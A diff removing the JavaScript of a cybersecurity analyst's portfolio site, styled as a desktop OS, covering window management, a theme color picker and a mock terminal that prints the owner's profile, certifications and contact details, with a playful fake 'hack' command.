-        if(dist<CONNECT_DIST){
-          var op=0.7-0.5*(dist/CONNECT_DIST);
-          ctx.beginPath();
-          ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);
-          ctx.strokeStyle="rgba("+accent+","+op+")";
-          ctx.lineWidth=1.5;
-          ctx.stroke();
-        }
-      }
-    }
-
-    // draw nodes
-    for(var i=0;i<particles.length;i++){
-      var p=particles[i];
-      var glow=0.5+0.5*Math.sin(p.pulse);
-      // outer glow
-      ctx.beginPath();ctx.arc(p.x,p.y,p.r+2+glow*2,0,6.28);
-      ctx.fillStyle="rgba("+accent+","+(0.04*glow)+")";ctx.fill();
-      // core dot
-      ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,6.28);
-      ctx.fillStyle="rgba("+accent+","+(0.5+0.3*glow)+")";ctx.fill();
-    }
-
-    // spawn packets
-    pkTimer++;
-    if(pkTimer>55){
-      pkTimer=0;
-      var ai=Math.floor(Math.random()*particles.length);
-      var bi=(ai+1+Math.floor(Math.random()*(particles.length-1)))%particles.length;
-      var a=particles[ai],b=particles[bi];
-      var dx=a.x-b.x,dy=a.y-b.y;
-      if(Math.sqrt(dx*dx+dy*dy)<CONNECT_DIST){
-        packets.push({a:a,b:b,t:0,speed:0.012+Math.random()*0.016});
-      }
-    }
-
-    // draw + move packets
-    for(var i=packets.length-1;i>=0;i--){
-      var pk=packets[i]; pk.t+=pk.speed;
-      if(pk.t>1){packets.splice(i,1);continue;}
-      var px=pk.a.x+(pk.b.x-pk.a.x)*pk.t;
-      var py=pk.a.y+(pk.b.y-pk.a.y)*pk.t;
-      var fade=Math.sin(pk.t*Math.PI);
-      ctx.beginPath();ctx.arc(px,py,2.2,0,6.28);
-      ctx.fillStyle="rgba("+accent+","+fade+")";ctx.fill();
-      // trail
-      ctx.beginPath();ctx.arc(px,py,4,0,6.28);
-      ctx.fillStyle="rgba("+accent+","+(fade*0.15)+")";ctx.fill();
-    }
-
-    requestAnimationFrame(draw);
-  }
-  draw();
-}
-
-// ===================== CLOCK =====================
-function updateClock(){
-  const now=new Date();
-  document.getElementById("clock").textContent=
-    now.toLocaleDateString("en-IN",{weekday:"short",month:"short",day:"2-digit"})+" "+
-    now.toLocaleTimeString("en-IN",{hour:"2-digit",minute:"2-digit",hour12:true});
-}
-setInterval(updateClock,1000);updateClock();
-
-// ===================== NEOFETCH UPTIME =====================
-const startTime=Date.now();
-setInterval(()=>{
-  const el=document.getElementById("nfUptime");
-  if(!el)return;
-  const s=Math.floor((Date.now()-startTime)/1000);
-  el.textContent=`${Math.floor(s/3600)}h ${Math.floor((s%3600)/60)}m ${s%60}s`;
-},1000);
-
-// ===================== WINDOW MANAGEMENT =====================
-let activeWindow=null;
-let zCounter=10;
-
-const windowState={};
-
-function initDesktop(){
-  // Open about by default with a slight delay
-  setTimeout(()=>openWindow('about'),200);
-  setTimeout(()=>openWindow('neofetch'),600);
-  animateSkillBars();
-  initTerminal();
-  buildWallpaperPicker();
-}
-
-function openWindow(name){
-  const win=document.getElementById("win-"+name);
-  if(!win)return;
-  win.style.display="flex";
-  win.classList.remove("minimized");
-  focusWindow(win,name);
-  updateTaskbar();
-  if(name==="skills")setTimeout(animateSkillBars,100);
-  if(name==="Theme"){setTimeout(()=>{buildPresetGrid();initThemeWheel();},60);}
-  if(name==="typingtest"){setTimeout(()=>{if(!ttSnippet){ttSnippet=getTTSnippet();}renderTTDisplay(document.getElementById("ttInput")?.value||"");},80);}
-  if(name==="tetris"){setTimeout(function(){if(typeof tetrisInit==="function")tetrisInit();},60);}
-  showNotif("Opened","~/"+name+" loaded successfully");
-}
-
-function closeWindow(name){
-  const win=document.getElementById("win-"+name);
-  if(!win)return;
-  win.style.display="none";
-  win.classList.remove("minimized","maximized","focused");
-  updateTaskbar();
-}
-
-function minimizeWindow(name){
-  const win=document.getElementById("win-"+name);
-  if(!win)return;
-  win.classList.toggle("minimized");
-  updateTaskbar();
-}
-
-function toggleMaximize(name){
-  const win=document.getElementById("win-"+name);
-  if(!win)return;
-  if(win.classList.contains("maximized")){
-    win.classList.remove("maximized");
-    const s=windowState[name];
-    if(s){win.style.width=s.w;win.style.height=s.h;win.style.top=s.t;win.style.left=s.l;}
-  } else {
-    windowState[name]={w:win.style.width,h:win.style.height,t:win.style.top,l:win.style.left};
-    win.classList.add("maximized");
-  }
-  focusWindow(win,name);
-}
-
-function focusWindow(win,name){
-  document.querySelectorAll(".window").forEach(w=>w.classList.remove("focused"));
-  win.classList.add("focused");
-  win.style.zIndex=++zCounter;
-  activeWindow=name;
-  updateTaskbar();
-}
-
-document.addEventListener("mousedown",(e)=>{
-  const win=e.target.closest(".window");
-  if(win){
-    const name=win.dataset.win;
-    if(name)focusWindow(win,name);
-  }
-});
-
-function updateTaskbar(){
-  const tasks=document.getElementById("taskbarTasks");
-  tasks.innerHTML="";
-  const wins=["about","skills","experience","projects","certs","contact","terminal","neofetch","wallpaper","snake","typingtest","tetris"];
-  const labels={"about":"👤 about","skills":"⚡ skills","experience":"📋 experience","projects":"🛡️ projects","certs":"🎓 certs","contact":"📡 contact","terminal":"💻 terminal","neofetch":"🖥️ neofetch","wallpaper":"🎨 theme","snake":"🐍 snake","typingtest":"⌨️ hack.exe","tetris":"🎮 tetris.exe"};
-  wins.forEach(n=>{
-    const win=document.getElementById("win-"+n);
-    if(!win||win.style.display==="none")return;
-    const btn=document.createElement("button");
-    btn.className="taskbar-task"+(activeWindow===n?" active":"");
-    btn.textContent=labels[n]||n;
-    btn.onclick=()=>{
-      if(win.classList.contains("minimized")){win.classList.remove("minimized");}
-      else if(activeWindow===n){win.classList.add("minimized");}
-      focusWindow(win,n);
-    };
-    tasks.appendChild(btn);
-  });
-}
-
-// ===================== DRAG =====================
-let dragState=null;
-function startDrag(e,winId){
-  if(e.target.classList.contains("win-dot"))return;
-  const win=document.getElementById(winId);
-  if(win.classList.contains("maximized"))return;
-  dragState={winId,startX:e.clientX,startY:e.clientY,
-    origLeft:parseInt(win.style.left)||0,origTop:parseInt(win.style.top)||0};
-  document.addEventListener("mousemove",onDrag);
-  document.addEventListener("mouseup",stopDrag);
-  e.preventDefault();
-}
-function onDrag(e){
-  if(!dragState)return;
-  const win=document.getElementById(dragState.winId);
-  const dx=e.clientX-dragState.startX;
-  const dy=e.clientY-dragState.startY;
-  win.style.left=(dragState.origLeft+dx)+"px";
-  win.style.top=Math.max(0,dragState.origTop+dy)+"px";
-}
-function stopDrag(){dragState=null;document.removeEventListener("mousemove",onDrag);document.removeEventListener("mouseup",stopDrag);}
-
-// ===================== RESIZE =====================
-let resizeState=null;
-function startResize(e,winId){
-  const win=document.getElementById(winId);
-  resizeState={winId,startX:e.clientX,startY:e.clientY,
-    origW:win.offsetWidth,origH:win.offsetHeight};
-  document.addEventListener("mousemove",onResize);
-  document.addEventListener("mouseup",stopResize);
-  e.preventDefault();e.stopPropagation();
-}
-function onResize(e){
-  if(!resizeState)return;
-  const win=document.getElementById(resizeState.winId);
-  const w=Math.max(280,resizeState.origW+(e.clientX-resizeState.startX));
-  const h=Math.max(180,resizeState.origH+(e.clientY-resizeState.startY));
-  win.style.width=w+"px";win.style.height=h+"px";
-}
-function stopResize(){resizeState=null;document.removeEventListener("mousemove",onResize);document.removeEventListener("mouseup",stopResize);}
-
-// ===================== SKILL BARS =====================
-function animateSkillBars(){
-  document.querySelectorAll(".skill-fill").forEach(bar=>{
-    const target=bar.dataset.w;
-    setTimeout(()=>{bar.style.width=target;},100);
-  });
-}
-
-// ===================== WALLPAPER SYSTEM =====================
-function makeParticles(count, color, maxY) {
-  return Array.from({length: count}, () => {
-    const x = (Math.random() * 1440) | 0;
-    const y = (Math.random() * (maxY || 900)) | 0;
-    const r = (Math.random() * 1.5 + 0.4).toFixed(1);
-    const d = (Math.random() * 4 + 2).toFixed(1);
-    const b = (Math.random() * 5).toFixed(1);
-    return `<circle cx="${x}" cy="${y}" r="${r}" fill="${color}"><animate attributeName="opacity" values="0;0.7;0" dur="${d}s" begin="${b}s" repeatCount="indefinite"/></circle>`;
-  }).join("");
-}
-
-// ══ THEME CUSTOMIZER ══════════════════════════════════════
-const PRESETS = [
-  {name:"Hacker",    hex:"#00ff9d"},
-  {name:"Cyber",     hex:"#00c8ff"},
-  {name:"Purple",    hex:"#b06fff"},
-  {name:"Red",       hex:"#ff3355"},
-  {name:"Amber",     hex:"#febc2e"},
-  {name:"Orange",    hex:"#ff6d00"},
-  {name:"Pink",      hex:"#ff5fa0"},
-  {name:"White",     hex:"#e0e0e0"},
-];
-
-let _wheelHue = 150, _wheelSat = 1.0, _wheelBrt = 1.0;
-let _draggingWheel = false;
-
-function hexToHSB(hex) {
-  let r=parseInt(hex.slice(1,3),16)/255, g=parseInt(hex.slice(3,5),16)/255, b=parseInt(hex.slice(5,7),16)/255;
-  let max=Math.max(r,g,b), min=Math.min(r,g,b), d=max-min;
-  let h=0, s=max===0?0:d/max, v=max;
-  if(d!==0){
-    if(max===r) h=((g-b)/d)%6;
-    else if(max===g) h=(b-r)/d+2;
-    else h=(r-g)/d+4;
-    h=Math.round(h*60); if(h<0)h+=360;
-  }
-  return {h,s,v};
-}
-
-function hsbToHex(h,s,v) {
-  let c=v*s, x=c*(1-Math.abs((h/60)%2-1)), m=v-c;
-  let r,g,b;
-  if(h<60){r=c;g=x;b=0;}else if(h<120){r=x;g=c;b=0;}else if(h<180){r=0;g=c;b=x;}
-  else if(h<240){r=0;g=x;b=c;}else if(h<300){r=x;g=0;b=c;}else{r=c;g=0;b=x;}
-  r=Math.round((r+m)*255); g=Math.round((g+m)*255); b=Math.round((b+m)*255);
-  return "#"+r.toString(16).padStart(2,"0")+g.toString(16).padStart(2,"0")+b.toString(16).padStart(2,"0");
-}
-
-function drawWheel(canvas) {
-  const ctx = canvas.getContext("2d");
-  const cx = canvas.width/2, cy = canvas.height/2, r = cx-2;
-  ctx.clearRect(0,0,canvas.width,canvas.height);
-  for(let angle=0; angle<360; angle++){
-    const startA = (angle-1)*Math.PI/180, endA = (angle+1)*Math.PI/180;
-    const grad = ctx.createRadialGradient(cx,cy,0,cx,cy,r);
-    grad.addColorStop(0,`hsl(${angle},0%,${_wheelBrt*100}%)`);
-    grad.addColorStop(1,`hsl(${angle},${_wheelSat*100}%,${_wheelBrt*50}%)`);
-    ctx.beginPath();
-    ctx.moveTo(cx,cy);
-    ctx.arc(cx,cy,r,startA,endA);
-    ctx.closePath();
-    ctx.fillStyle=grad;
-    ctx.fill();
-  }
-  // Center white dot
-  const cg=ctx.createRadialGradient(cx,cy,0,cx,cy,r*0.18);
-  cg.addColorStop(0,`rgba(255,255,255,${_wheelBrt})`);
-  cg.addColorStop(1,"rgba(255,255,255,0)");
-  ctx.beginPath();ctx.arc(cx,cy,r*0.18,0,Math.PI*2);ctx.fillStyle=cg;ctx.fill();
-}
-
-function wheelAngleToXY(hue, sat, canvas) {
-  const cx=canvas.width/2, cy=canvas.height/2, r=(cx-2)*sat;
-  const a=(hue-90)*Math.PI/180;
-  return {x:cx+r*Math.cos(a), y:cy+r*Math.sin(a)};
-}
-
-function xyToHueSat(x,y,canvas) {
-  const cx=canvas.width/2, cy=canvas.height/2, r=cx-2;
-  const dx=x-cx, dy=y-cy;
-  const dist=Math.sqrt(dx*dx+dy*dy);
-  const sat=Math.min(1,dist/r);
-  let hue=Math.atan2(dy,dx)*180/Math.PI+90;
-  if(hue<0)hue+=360;
-  return {hue:Math.round(hue)%360, sat};
-}
-
-function updateWheelCursor() {
-  const canvas=document.getElementById("themeWheel");
-  if(!canvas) return;
-  const pos=wheelAngleToXY(_wheelHue,_wheelSat,canvas);
-  const cur=document.getElementById("wheelCursor");
-  cur.style.left=pos.x+"px"; cur.style.top=pos.y+"px";
-  const hex=hsbToHex(_wheelHue,_wheelSat,_wheelBrt);
-  cur.style.background=hex;
-  updateHexPreview(hex);
-}
-
-function updateHexPreview(hex) {
-  const hi=document.getElementById("hexInput");
-  const ps=document.getElementById("previewSwatch");
-  if(hi) hi.value=hex;
-  if(ps) ps.style.background=hex;
-  // Update slider thumb accent
-  document.querySelectorAll(".theme-slider").forEach(s=>s.style.setProperty("--sl-color",hex));
-}
-
-function initThemeWheel() {
-  const canvas=document.getElementById("themeWheel");
-  if(!canvas) return;
-  drawWheel(canvas);
-  updateWheelCursor();
-
-  function handleWheel(e) {
-    const rect=canvas.getBoundingClientRect();
-    const x=e.clientX-rect.left, y=e.clientY-rect.top;
-    const {hue,sat}=xyToHueSat(x,y,canvas);
-    _wheelHue=hue; _wheelSat=sat;
-    updateWheelCursor();
-  }
-  canvas.addEventListener("mousedown",(e)=>{_draggingWheel=true;handleWheel(e);});
-  document.addEventListener("mousemove",(e)=>{if(_draggingWheel)handleWheel(e);});
-  document.addEventListener("mouseup",()=>_draggingWheel=false);
-  // Touch
-  canvas.addEventListener("touchstart",(e)=>{e.preventDefault();_draggingWheel=true;const t=e.touches[0];const rect=canvas.getBoundingClientRect();const x=t.clientX-rect.left,y=t.clientY-rect.top;const {hue,sat}=xyToHueSat(x,y,canvas);_wheelHue=hue;_wheelSat=sat;updateWheelCursor();},{passive:false});
-  canvas.addEventListener("touchmove",(e)=>{e.preventDefault();if(!_draggingWheel)return;const t=e.touches[0];const rect=canvas.getBoundingClientRect();const x=t.clientX-rect.left,y=t.clientY-rect.top;const {hue,sat}=xyToHueSat(x,y,canvas);_wheelHue=hue;_wheelSat=sat;updateWheelCursor();},{passive:false});
-
-  // Brightness slider
-  const brtS=document.getElementById("brtSlider");
-  if(brtS){
-    brtS.addEventListener("input",()=>{
-      _wheelBrt=brtS.value/100;
-      document.getElementById("brtVal").textContent=brtS.value+"%";
-      drawWheel(canvas);updateWheelCursor();
-    });
-  }
-  // Saturation slider
-  const satS=document.getElementById("satSlider");
-  if(satS){
-    satS.addEventListener("input",()=>{
-      _wheelSat=satS.value/100;
-      document.getElementById("satVal").textContent=satS.value+"%";
-      updateWheelCursor();
-    });
-  }
-  // Hex input
-  const hexI=document.getElementById("hexInput");
-  if(hexI){
-    hexI.addEventListener("input",()=>{
-      const v=hexI.value;
-      if(/^#[0-9a-fA-F]{6}$/.test(v)){
-        const {h,s,v:bv}=hexToHSB(v);
-        _wheelHue=h;_wheelSat=s;_wheelBrt=bv;
-        if(brtS){brtS.value=Math.round(bv*100);document.getElementById("brtVal").textContent=Math.round(bv*100)+"%";}
-        if(satS){satS.value=Math.round(s*100);document.getElementById("satVal").textContent=Math.round(s*100)+"%";}
-        drawWheel(canvas);updateWheelCursor();
-        document.getElementById("previewSwatch").style.background=v;
-      }
-    });
-    hexI.addEventListener("keydown",(e)=>{if(e.key==="Enter")applyCustomTheme();});
-  }
-}
-
-function buildPresetGrid() {
-  const grid=document.getElementById("presetGrid");
-  if(!grid) return;
-  grid.innerHTML="";
-  PRESETS.forEach(p=>{
-    const btn=document.createElement("div");
-    btn.className="preset-btn"+(p.hex==="#00ff9d"?" active":"");
-    btn.innerHTML=`<div class="preset-swatch" style="background:${p.hex};box-shadow:0 0 10px ${p.hex};color:${p.hex}"></div><div class="preset-name">${p.name}</div>`;
-    btn.onclick=()=>{
-      document.querySelectorAll(".preset-btn").forEach(b=>b.classList.remove("active"));
-      btn.classList.add("active");
-      const {h,s,v}=hexToHSB(p.hex);
-      _wheelHue=h;_wheelSat=s;_wheelBrt=v;
-      const brtS=document.getElementById("brtSlider");
-      const satS=document.getElementById("satSlider");
-      if(brtS){brtS.value=Math.round(v*100);document.getElementById("brtVal").textContent=Math.round(v*100)+"%";}
-      if(satS){satS.value=Math.round(s*100);document.getElementById("satVal").textContent=Math.round(s*100)+"%";}
-      const canvas=document.getElementById("themeWheel");
-      drawWheel(canvas);updateWheelCursor();
-      applyThemeColor(p.hex);
-    };
-    grid.appendChild(btn);
-  });
-}
-
-function hexToRgb(hex){
-  const r=parseInt(hex.slice(1,3),16);
-  const g=parseInt(hex.slice(3,5),16);
-  const b=parseInt(hex.slice(5,7),16);
-  return r+","+g+","+b;
-}
-function applyThemeColor(hex) {
-  const root=document.documentElement;
-  // Core accent
-  root.style.setProperty("--accent", hex);
-  root.style.setProperty("--accent2", hex);
-  root.style.setProperty("--accent-rgb", hexToRgb(hex));
-  // Window shadow updates automatically via --accent-rgb
-  // Border tint for focused windows - handled by rgba(var(--accent-rgb))
-  // Update slider thumb color
-  const styleId="theme-dynamic-style";
-  let el=document.getElementById(styleId);
-  if(!el){el=document.createElement("style");el.id=styleId;document.head.appendChild(el);}
-  el.textContent=`
-    .theme-slider::-webkit-slider-thumb{background:${hex}!important;box-shadow:0 0 6px ${hex}!important;}
-    .theme-slider::-moz-range-thumb{background:${hex}!important;}
-    .win-resize{background:linear-gradient(135deg,transparent 50%,rgba(var(--accent-rgb),0.3) 50%)!important;}
-    .taskbar-start{background:rgba(var(--accent-rgb),0.1)!important;border:1px solid rgba(var(--accent-rgb),0.3)!important;}
-    .taskbar-start:hover{background:rgba(var(--accent-rgb),0.2)!important;}
-    #startMenu .sm-item:hover{background:rgba(var(--accent-rgb),0.08)!important;color:${hex}!important;}
-    .hk-fill{background:linear-gradient(90deg,${hex},${hex}88)!important;}
-    .hk-sweep,.hack-scan{background:linear-gradient(90deg,transparent,${hex},transparent)!important;box-shadow:0 0 8px ${hex}!important;}
-    .apply-theme-btn{background:${hex}!important;}
-    .preset-btn.active{border-color:${hex}!important;}
-    .about-badge{border-color:rgba(var(--accent-rgb),0.4)!important;color:${hex}!important;}
-    ::-webkit-scrollbar-thumb{background:rgba(var(--accent-rgb),0.3)!important;}
-  `;
-  showNotif("Theme","Accent → "+hex);
-}
-
-function applyCustomTheme() {
-  const hex=hsbToHex(_wheelHue,_wheelSat,_wheelBrt);
-  document.querySelectorAll(".preset-btn").forEach(b=>b.classList.remove("active"));
-  applyThemeColor(hex);
-}
-
-function buildWallpaperPicker() {
-  buildPresetGrid();
-  // Delay wheel init until window is visible
-  setTimeout(initThemeWheel, 50);
-}
-
-// ===================== CONTEXT MENU =====================
-function toggleStartMenu(){
-  const m=document.getElementById("startMenu");
-  if(m.style.display==="flex"){hideStart();return;}
-  hideCtx();
-  m.style.display="flex";
-}
-function hideStart(){
-  const m=document.getElementById("startMenu");
-  if(m) m.style.display="none";
-}
-function showCtxMenu(e){
-  e.preventDefault();
-  const m=document.getElementById("ctxMenu");
-  m.style.display="block";
-  m.style.left=e.clientX+"px";
-  m.style.top=e.clientY+"px";
-}
-function hideCtx(){document.getElementById("ctxMenu").style.display="none";}
-document.addEventListener("click",(e)=>{
-  if(!e.target.closest("#ctxMenu")) hideCtx();
-  if(!e.target.closest("#startMenu")&&!e.target.closest(".taskbar-start")) hideStart();
-});
-document.addEventListener("contextmenu",(e)=>{if(e.target===document.body||e.target===document.getElementById("desktop")||e.target.id==="desktop")return;hideCtx();});
-
-function openAllWindows(){["about","skills","experience","projects","certs","contact","terminal","neofetch"].forEach(openWindow);}
-function closeAllWindows(){["about","skills","experience","projects","certs","contact","terminal","neofetch","wallpaper","snake","typingtest","tetris"].forEach(closeWindow);}
-
-// ===================== NOTIFICATIONS =====================
-let notifTimeout;
-function showNotif(title,msg){
-  let n=document.querySelector(".notif");
-  if(n)n.remove();
-  clearTimeout(notifTimeout);
-  n=document.createElement("div");
-  n.className="notif";
-  n.innerHTML=`<div class="notif-title">⚡ ${title}</div><div>${msg}</div>`;
-  document.body.appendChild(n);
-  notifTimeout=setTimeout(()=>{if(n.parentNode)n.remove();},2500);
-}
-
-// ===================== TERMINAL =====================
-const termData={
-  home:`<span class="t-green">========================</span>
-<span class="t-green">   PROFILE / HOME</span>
-<span class="t-green">========================</span>
-<span class="t-muted">Name:</span>     Ankesh Prajapati
-<span class="t-muted">Role:</span>     Cybersecurity Analyst (VAPT)
-<span class="t-muted">Org:</span>      Securis360
-<span class="t-muted">Location:</span>  India
-<span class="t-muted">Mindset:</span>  Break-first, document properly.
-`,
-  skills:`<span class="t-yellow">VAPT Coverage:</span>
-  Web / Mobile / API / Network / Cloud
-  Source Code Review / Digital Forensics
-
-<span class="t-yellow">Tools:</span>
-  Burp Suite, Nessus, Nmap, Metasploit
-  Wireshark, Kali Linux
-
-<span class="t-yellow">Forensics:</span>
-  UFED, EnCase, Talon
-`,
-  experience:`<span class="t-blue">[2025-Now]</span> <span class="t-green">Security Analyst @ Securis360</span>
-  50+ VAPT assessments, critical findings exploitation,
-  detailed reporting, patch validation.
-
-<span class="t-blue">[2024-2025]</span> <span class="t-green">DFIR Intern @ State Cyber Crime Cell</span>
-   forensic investigations, govt pentesting,
-  fraud pattern analysis.
-
-<span class="t-blue">[2022-2023]</span> <span class="t-yellow">Web Developer @ MOROSQ</span>
-  Secure web modules, vuln patching.
-`,
-  projects:`<span class="t-green">1. Crime Analysis System</span>
-   Phishing detection, credential analysis,
-   behaviour-driven crime pattern mapping.
-
-<span class="t-green">2. Crime Heat Map</span>
-   Crime density visualization by region,
-   investigator-friendly dashboards.
-
-<span class="t-green">3. Helpline Data System</span>
-   MO-wise crime data, visual analytics.
-`,
-  certs:`<span class="t-green">✓</span> Certified Ethical Hacker (CEH)
-<span class="t-green">✓</span> Certified Network Security Practitioner (CNSP)
-<span class="t-green">✓</span> Windows Forensics — Belkasoft
-<span class="t-green">✓</span> Advanced Digital Forensics — Belkasoft
-<span class="t-green">✓</span> Junior Cybersecurity Analyst — Cisco
-<span class="t-green">✓</span> Endpoint Security — Cisco
-<span class="t-green">✓</span> PHP & MySQL Training — IIT Bombay
-<span class="t-green">✓</span> Power BI — Parul University
-`,
-  contact:`<span class="t-green">Email:</span>    ankeshprajapati217@gmail.com
-<span class="t-green">Phone:</span>    +91 93282 36503
-<span class="t-green">LinkedIn:</span> linkedin.com/in/ankesh-prajapati-0a87a8249
-<span class="t-green">Location:</span>  India
-`,
-  education:`<span class="t-green">M.C.A.</span> Cybersecurity & Digital Forensics
-  Parul University (2023-2025)
-
-<span class="t-green">B.C.A.</span>
-  Veer Narmad South Gujarat University (2019-2022)
-`
-};
-
-const breachLogs=[
-  "suspicious login pattern detected...",
-  "analyzing abnormal network flow...",
-  "cross-referencing IOC signatures...",
-  "hash mismatch in critical binary...",
-  "failed login attempts spiking from remote subnet...",
-  "unauthorized API probe detected...",
-  "privilege escalation attempt logged...",
-  "potential data exfiltration route identified...",
-  "SSL certificate anomaly detected...",
-  "port scan incoming from 192.168.x.x...",
-];
-
-// ═══ TERMINAL ENGINE ═══════════════════════════════════════════════════════
-var cmdHistory=[],histIdx=-1,termBusy=false,_tv="";
-
-function termFocus(){
-  var ta=document.getElementById("termCapture");
-  if(ta)ta.focus();
-}
-function termScrollBottom(){
-  var sc=document.getElementById("termScroll");
-  if(sc)sc.scrollTop=sc.scrollHeight;
-}
-function escHtml(s){
-  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
-}
-function termSync(){
-  var t=document.getElementById("termTyped");
-  if(t)t.textContent=_tv;
-  termScrollBottom();
-}
-function termFreeze(){
-  var ps1="<span class=\"t-green\">ankesh</span>"+"<span class=\"t-muted\">@</span>"+"<span class=\"t-blue\">root</span>"+"<span class=\"t-muted\">:~$</span> ";
-  printTerm(ps1+escHtml(_tv));
-}
-
-function initTerminal(){
-  var ta=document.getElementById("termCapture");
-  if(!ta)return;
-  _tv=""; ta.value="";
-  printTerm("<span class=\"t-green\">Ankesh-OS</span> <span class=\"t-muted\">v2.5.1 — ankesh@root</span>");
-  printTerm("<span class=\"t-muted\">─────────────────────────────────────</span>");
-  printTerm("Type <span class=\"t-green\">help</span> for commands. Tab to autocomplete.");
-  printTerm("");
-
-  ta.addEventListener("input",function(){
-    // strip any newlines that sneak in (mobile return key)
-    var v=ta.value;
-    var clean="";
-    for(var i=0;i<v.length;i++){if(v[i]!=="\n"&&v[i]!=="\r")clean+=v[i];}
-    ta.value=clean;
-    _tv=clean;
-    termSync();
-  });
-
-  ta.addEventListener("keydown",function(e){
-    if(termBusy&&!(e.ctrlKey&&e.key==="c"))return;
-    if(e.key==="Enter"){
-      e.preventDefault();
-      var cmd=_tv.trim();
-      termFreeze();
-      _tv="";ta.value="";
-      termSync();
-      if(cmd){cmdHistory.unshift(cmd);histIdx=-1;handleTermCmd(cmd);}
-      termScrollBottom();
-    } else if(e.key==="ArrowUp"){
-      e.preventDefault();
-      histIdx=Math.min(histIdx+1,cmdHistory.length-1);
-      _tv=cmdHistory[histIdx]||"";ta.value=_tv;termSync();
-    } else if(e.key==="ArrowDown"){
-      e.preventDefault();
-      histIdx=Math.max(histIdx-1,-1);
-      _tv=histIdx>=0?cmdHistory[histIdx]:"";ta.value=_tv;termSync();
-    } else if(e.key==="Tab"){
-      e.preventDefault();
-      var p=_tv.toLowerCase().trimStart();
-      var opts=["help","whoami","pwd","ls","ls -la","clear","exit","scan","hack ","open ","about","skills","experience","projects","certs","contact"];
-      var m=opts.find(function(o){return o.startsWith(p)&&o!==p;});
-      if(m){_tv=m;ta.value=m;termSync();}
-    } else if(e.ctrlKey&&e.key==="c"){
-      e.preventDefault();
-      termFreeze();
-      var out=document.getElementById("termOutput");
-      if(out&&out.lastChild)out.lastChild.innerHTML+='<span class="t-muted">^C</span>';
-      _tv="";ta.value="";termSync();
-      termBusy=false;histIdx=-1;
-    } else if(e.ctrlKey&&e.key==="l"){
-      e.preventDefault();
-      document.getElementById("termOutput").innerHTML="";
-      termScrollBottom();
-    }
-  });
-
-  var body=document.getElementById("termBody");
-  if(body){
-    body.addEventListener("click",termFocus);
-    body.addEventListener("touchend",function(e){e.preventDefault();termFocus();},{passive:false});
-  }
-  ta.addEventListener("blur",function(){
-    setTimeout(function(){
-      var w=document.getElementById("win-terminal");
-      if(w&&w.style.display!=="none"&&w.classList.contains("focused"))termFocus();
-    },200);
-  });
-  termFocus();
-}
-
-function printTerm(html){
-  var out=document.getElementById("termOutput");
-  if(!out)return;
-  // Split on literal \n within the html so multi-line strings each get their own div
-  var lines=html.split("\n");
-  for(var i=0;i<lines.length;i++){
-    var d=document.createElement("div");
-    d.className="term-line";
-    // Empty line: use a zero-width space so the div has natural line height
-    d.innerHTML=lines[i]===""?"\u200b":lines[i];
-    out.appendChild(d);
-  }
-  termScrollBottom();
-}
-// ═══ END TERMINAL ════════════════════════════════════════════════════════════
-
-
-function handleTermCmd(cmd){
-  const c=cmd.toLowerCase().trim();
-  if(c==="help"){
-    printTerm('<span class="t-muted">available commands:</span>');
-    printTerm('  <span class="t-green">about</span>  <span class="t-green">skills</span>  <span class="t-green">experience</span>  <span class="t-green">projects</span>  <span class="t-green">certs</span>  <span class="t-green">contact</span>');
-    printTerm('  <span class="t-green">whoami</span>  <span class="t-green">pwd</span>  <span class="t-green">ls</span>  <span class="t-green">clear</span>  <span class="t-green">exit</span>  <span class="t-green">scan</span>');
-    printTerm('  <span class="t-green">hack &lt;target&gt;</span>  <span class="t-muted">e.g. hack nasa.gov</span>');
-    printTerm('  <span class="t-green">open &lt;window&gt;</span>  <span class="t-muted">e.g. open about</span>');
-    printTerm('  <span class="t-muted">Tab</span> autocomplete  ·  <span class="t-muted">↑↓</span> history  ·  <span class="t-muted">Ctrl+C</span> cancel');
-  } else if(c==="whoami"){
-    printTerm('<span class="t-green">ankesh</span> — Security Analyst | VAPT Specialist');
-  } else if(c==="pwd"){
-    printTerm('<span class="t-muted">/home/ankesh/portfolio</span>');
-  } else if(c==="ls"||c==="ls -la"){
-    printTerm('<span class="t-muted">total 48</span>');
-    printTerm('<span class="t-blue">drwxr-xr-x</span>  ankesh  staff   about.sh');
-    printTerm('<span class="t-blue">drwxr-xr-x</span>  ankesh  staff   skills.sh');
-    printTerm('<span class="t-blue">drwxr-xr-x</span>  ankesh  staff   experience.log');
-    printTerm('<span class="t-blue">drwxr-xr-x</span>  ankesh  staff   projects/');
-    printTerm('<span class="t-blue">drwxr-xr-x</span>  ankesh  staff   certs.db');
-    printTerm('<span class="t-green">-rwxr-xr-x</span>  ankesh  staff   contact.txt');
-  } else if(c==="clear"){
-    document.getElementById("termOutput").innerHTML="";
-  } else if(c==="exit"){
-    printTerm("Closing terminal...");
-    setTimeout(()=>closeWindow("terminal"),500);
-  } else if(c==="konami"){
-    printTerm('<span class="t-yellow">Hint: Type the Konami code (↑↑↓↓←→←→BA) to trigger RED TEAM mode.</span>');
-  } else if(c==="scan"){
-    runScan();
-  } else if(c.startsWith("open ")){
-    const target=c.replace("open ","").trim();
-    const valid=["about","skills","experience","projects","certs","contact","terminal","neofetch","wallpaper"];
-    if(valid.includes(target)){
-      openWindow(target);
-      printTerm(`<span class="t-green">Opening ${target}...</span>`);
-    } else {
-      printTerm(`<span class="t-red">open: '${target}' not found.</span> Try: ${valid.join(", ")}`);
-    }
-  } else if(c.startsWith("hack ")||c==="hack"){
-    const tgt=(c==="hack")?"localhost":c.slice(5).trim();
-    if(!tgt){printTerm('<span class="t-red">Usage: hack &lt;target&gt;</span>');}
-    else{runHack(tgt);}
-  } else if(c==="about"){
-    printTerm('<span class="t-green">┌──────────────────────────────────────┐</span>');
-    printTerm('<span class="t-green">│</span>  <span class="t-green">ANKESH PRAJAPATI</span>                    <span class="t-green">│</span>');
-    printTerm('<span class="t-green">│</span>  Security Analyst · VAPT Specialist  <span class="t-green">│</span>');
-    printTerm('<span class="t-green">└──────────────────────────────────────┘</span>');
-    printTerm('<span class="t-muted">Name    :</span> Ankesh Prajapati');
-    printTerm('<span class="t-muted">Role    :</span> Cybersecurity Analyst (VAPT)');
-    printTerm('<span class="t-muted">Company :</span> Securis360');
-    printTerm('<span class="t-muted">Focus   :</span> Web · Mobile · API · Network · Cloud');
-    printTerm('<span class="t-muted">Former  :</span> State Cyber Crime Cell (CID)');
-    printTerm('<span class="t-muted">Email   :</span> ankeshprajapati217@gmail.com');
